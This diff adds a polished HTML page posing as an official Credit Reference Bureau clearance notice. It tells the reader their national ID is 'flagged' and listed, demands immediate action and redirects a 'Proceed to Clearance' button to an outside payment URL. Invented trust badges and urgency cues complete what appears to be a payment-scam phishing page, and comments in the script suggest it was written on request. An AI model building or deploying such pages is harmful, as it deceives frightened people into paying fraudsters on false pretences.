@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CRB Clearance Notice</title>
+  <!-- Google Fonts for a fancy, modern look -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,600;14..32,800&display=swap" rel="stylesheet">
+  <!-- Font Awesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    /* Reset and base styles */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: radial-gradient(circle at 30% 10%, #0b1c2f, #0a121c 90%);
+      padding: 1.5rem;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    /* Fancy glowing orbs in background */
+    body::before,
+    body::after {
+      content: '';
+      position: absolute;
+      width: 60vmax;
+      height: 60vmax;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(0, 255, 255, 0.15) 0%, transparent 70%);
+      top: -20vmax;
+      left: -20vmax;
+      z-index: 0;
+      animation: float 18s infinite alternate ease-in-out;
+    }
+
+    body::after {
+      background: radial-gradient(circle, rgba(255, 0, 200, 0.12) 0%, transparent 70%);
+      top: auto;
+      bottom: -30vmax;
+      right: -20vmax;
+      left: auto;
+      width: 70vmax;
+      height: 70vmax;
+      animation-duration: 24s;
+      animation-delay: -5s;
+    }
+
+    @keyframes float {
+      0% { transform: translate(0, 0) scale(1); }
+      100% { transform: translate(8%, 8%) scale(1.1); }
+    }
+
+    /* Main card – glassmorphism with neon accents */
+    .card {
+      position: relative;
+      z-index: 10;
+      max-width: 700px;
+      width: 100%;
+      background: rgba(18, 28, 40, 0.65);
+      backdrop-filter: blur(14px) saturate(180%);
+      -webkit-backdrop-filter: blur(14px) saturate(180%);
+      border-radius: 2.5rem;
+      border: 1px solid rgba(0, 255, 255, 0.25);
+      box-shadow: 0 30px 50px -20px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(0, 255, 255, 0.1) inset, 0 0 40px rgba(0, 180, 255, 0.2);
+      padding: 2.5rem 2rem;
+      transition: transform 0.3s ease, box-shadow 0.4s ease;
+      animation: cardAppear 0.9s cubic-bezier(0.23, 1, 0.32, 1);
+    }
+
+    .card:hover {
+      box-shadow: 0 35px 60px -18px #000, 0 0 0 1px rgba(0, 255, 255, 0.4) inset, 0 0 60px rgba(0, 180, 255, 0.4);
+      transform: translateY(-3px);
+    }
+
+    @keyframes cardAppear {
+      0% { opacity: 0; transform: scale(0.92) translateY(30px); }
+      100% { opacity: 1; transform: scale(1) translateY(0); }
+    }
+
+    /* Icon & header */
+    .icon-badge {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 1.25rem;
+    }
+
+    .icon-badge i {
+      font-size: 4.5rem;
+      color: #ffd966;
+      filter: drop-shadow(0 0 15px #ffb347) drop-shadow(0 0 35px #ff7e05);
+      animation: pulse 2.2s infinite ease-in-out;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); filter: drop-shadow(0 0 15px #ffb347) drop-shadow(0 0 35px #ff7e05); }
+      50% { transform: scale(1.05); filter: drop-shadow(0 0 25px #ffaa33) drop-shadow(0 0 55px #ff9900); }
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 2.4rem;
+      font-weight: 800;
+      letter-spacing: -0.02em;
+      background: linear-gradient(135deg, #fff 0%, #a0e9ff 40%, #6ec8ff 80%);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-shadow: 0 0 20px rgba(0, 180, 255, 0.5);
+      margin-bottom: 0.75rem;
+      line-height: 1.2;
+    }
+
+    .subhead {
+      text-align: center;
+      font-size: 1.1rem;
+      font-weight: 400;
+      color: #cbd5e1;
+      margin-bottom: 2rem;
+      border-bottom: 1px dashed rgba(0, 255, 255, 0.3);
+      padding-bottom: 1.25rem;
+      letter-spacing: 0.2px;
+    }
+
+    .alert-box {
+      background: rgba(255, 70, 70, 0.12);
+      border-left: 6px solid #ff4d4d;
+      border-radius: 1.2rem;
+      padding: 1.5rem 1.8rem;
+      margin-bottom: 2rem;
+      backdrop-filter: blur(5px);
+      box-shadow: 0 0 30px rgba(255, 70, 70, 0.2);
+      display: flex;
+      align-items: flex-start;
+      gap: 1rem;
+    }
+
+    .alert-box i {
+      color: #ff5e5e;
+      font-size: 2rem;
+      flex-shrink: 0;
+      margin-top: 0.2rem;
+      filter: drop-shadow(0 0 8px #ff3b3b);
+    }
+
+    .alert-content {
+      flex: 1;
+    }
+
+    .alert-content h2 {
+      color: #ffb3b3;
+      font-weight: 700;
+      font-size: 1.5rem;
+      letter-spacing: -0.01em;
+      margin-bottom: 0.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      flex-wrap: wrap;
+    }
+
+    .alert-content h2 i {
+      font-size: 1.3rem;
+      color: #ff5e5e;
+      margin: 0;
+    }
+
+    .alert-content p {
+      color: #e2e8f0;
+      line-height: 1.6;
+      font-size: 1.05rem;
+      font-weight: 400;
+      margin-bottom: 0.5rem;
+    }
+
+    .id-display {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 40px;
+      padding: 0.5rem 1.2rem;
+      display: inline-block;
+      font-family: 'Inter', monospace;
+      font-weight: 700;
+      letter-spacing: 1px;
+      color: #a5f3fc;
+      border: 1px solid rgba(0, 255, 255, 0.3);
+      box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);
+      margin-top: 0.3rem;
+      font-size: 1rem;
+    }
+
+    .highlight {
+      color: #fde047;
+      font-weight: 700;
+      text-shadow: 0 0 10px rgba(253, 224, 71, 0.5);
+    }
+
+    /* Action area */
+    .action-area {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 0.5rem;
+    }
+
+    .btn-proceed {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 1rem;
+      background: linear-gradient(145deg, #00c6ff, #0072ff);
+      border: none;
+      border-radius: 80px;
+      padding: 1.2rem 2.8rem;
+      font-size: 1.4rem;
+      font-weight: 700;
+      color: white;
+      letter-spacing: 0.5px;
+      cursor: pointer;
+      box-shadow: 0 15px 30px -8px #0072ff, 0 0 0 2px rgba(255, 255, 255, 0.1) inset, 0 0 30px rgba(0, 160, 255, 0.6);
+      transition: all 0.25s ease;
+      text-transform: uppercase;
+      width: 100%;
+      max-width: 400px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn-proceed i {
+      font-size: 1.6rem;
+      transition: transform 0.2s ease;
+    }
+
+    .btn-proceed:hover {
+      background: linear-gradient(145deg, #1ad0ff, #0a84ff);
+      box-shadow: 0 20px 40px -8px #00a6ff, 0 0 0 3px rgba(255, 255, 255, 0.2) inset, 0 0 45px #00a6ff;
+      transform: translateY(-2px) scale(1.01);
+    }
+
+    .btn-proceed:active {
+      transform: translateY(2px) scale(0.99);
+      box-shadow: 0 10px 20px -5px #0072ff, 0 0 30px #0072ff;
+    }
+
+    .btn-proceed:hover i {
+      transform: translateX(5px);
+    }
+
+    .btn-proceed::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+      transition: left 0.6s ease;
+    }
+
+    .btn-proceed:hover::after {
+      left: 100%;
+    }
+
+    /* Security note */
+    .security-note {
+      margin-top: 2rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.6rem;
+      color: #94a3b8;
+      font-size: 0.9rem;
+      font-weight: 400;
+      text-align: center;
+      flex-wrap: wrap;
+      padding-top: 0.8rem;
+      border-top: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .security-note i {
+      color: #22d3ee;
+      font-size: 1rem;
+      filter: drop-shadow(0 0 6px #22d3ee);
+    }
+
+    .security-note .separator {
+      color: #334155;
+      margin: 0 0.2rem;
+    }
+
+    /* Responsive */
+    @media (max-width: 550px) {
+      .card {
+        padding: 1.8rem 1.2rem;
+        border-radius: 2rem;
+      }
+      h1 {
+        font-size: 1.9rem;
+      }
+      .alert-box {
+        padding: 1.2rem;
+        flex-direction: column;
+        gap: 0.7rem;
+      }
+      .alert-box i {
+        font-size: 1.8rem;
+      }
+      .alert-content h2 {
+        font-size: 1.3rem;
+      }
+      .btn-proceed {
+        font-size: 1.2rem;
+        padding: 1rem 1.8rem;
+        gap: 0.7rem;
+      }
+      .btn-proceed i {
+        font-size: 1.4rem;
+      }
+      .security-note {
+        font-size: 0.8rem;
+        gap: 0.3rem;
+      }
+    }
+
+    /* Additional fancy shimmering line */
+    .shimmer-line {
+      height: 2px;
+      width: 70%;
+      margin: 1.5rem auto 0.8rem;
+      background: linear-gradient(90deg, transparent, #00ffff, #ff00ff, #00ffff, transparent);
+      background-size: 300% 100%;
+      animation: shimmer 3s infinite linear;
+      border-radius: 10px;
+      opacity: 0.7;
+    }
+
+    @keyframes shimmer {
+      0% { background-position: 0% 0; }
+      100% { background-position: 300% 0; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <!-- Icon -->
+    <div class="icon-badge">
+      <i class="fas fa-shield-halved"></i>
+    </div>
+
+    <!-- Main heading -->
+    <h1>CRB Clearance Required</h1>
+    <div class="subhead">
+      <i class="fas fa-exclamation-triangle" style="color: #ffb347; margin-right: 6px;"></i>
+      Official notification – immediate action needed
+    </div>
+
+    <!-- Alert / warning box -->
+    <div class="alert-box">
+      <i class="fas fa-user-lock"></i>
+      <div class="alert-content">
+        <h2>
+          <i class="fas fa-id-card"></i> ID Listed on CRB
+        </h2>
+        <p>
+          Your national ID <span class="id-display"><i class="fas fa-fingerprint" style="font-size: 0.9rem; margin-right: 6px;"></i> XXXX-XXXX-XXXX</span><br>
+          has been flagged and is currently <span class="highlight">listed with the Credit Reference Bureau (CRB)</span>.
+        </p>
+        <p style="font-size: 1rem; margin-top: 0.6rem;">
+          <i class="fas fa-circle-exclamation" style="color: #ffb347; margin-right: 6px;"></i>
+          To restore your credit status, you are required to <strong>clear the outstanding listing</strong> immediately.
+        </p>
+      </div>
+    </div>
+
+    <!-- Call to action -->
+    <div class="action-area">
+      <button id="proceedBtn" class="btn-proceed">
+        <i class="fas fa-lock-open"></i> Proceed to Clearance
+        <i class="fas fa-arrow-right"></i>
+      </button>
+      <div class="shimmer-line"></div>
+    </div>
+
+    <!-- Security / trust note -->
+    <div class="security-note">
+      <i class="fas fa-shield-alt"></i>
+      <span>Secure payment gateway</span>
+      <span class="separator">•</span>
+      <i class="fas fa-lock"></i>
+      <span>256-bit SSL encrypted</span>
+      <span class="separator">•</span>
+      <i class="fas fa-clock"></i>
+      <span>Instant clearance processing</span>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // Payment URL as specified
+      const PAYMENT_URL = 'https://optimapaybridge.co.ke/payment.php?pay=gok';
+
+      // Get the button element
+      const proceedBtn = document.getElementById('proceedBtn');
+
+      // Add click event listener for redirect
+      proceedBtn.addEventListener('click', function(e) {
+        // Optional: add a small visual feedback before redirect (fade effect on button)
+        // But we want immediate redirect, so we'll just do it.
+        
+        // Show a subtle loading state (optional but fancy)
+        // However, since it's a redirect, we can just open the link.
+        // Use window.location.href for same-tab redirect.
+        // For better UX, we could show a quick "Redirecting..." but not necessary.
+        
+        // Redirect to the payment link
+        window.location.href = PAYMENT_URL;
+
+        // Alternative: window.open(PAYMENT_URL, '_blank'); // if you want new tab
+        // But the instruction says "redirect to payment link", so same tab is fine.
+      });
+
+      // Optional: Add a small console greeting or security check (just for flair)
+      console.log('🔐 CRB clearance notice – ready. Proceed to payment.');
+    })();
+  </script>
+
+</body>
+</html>
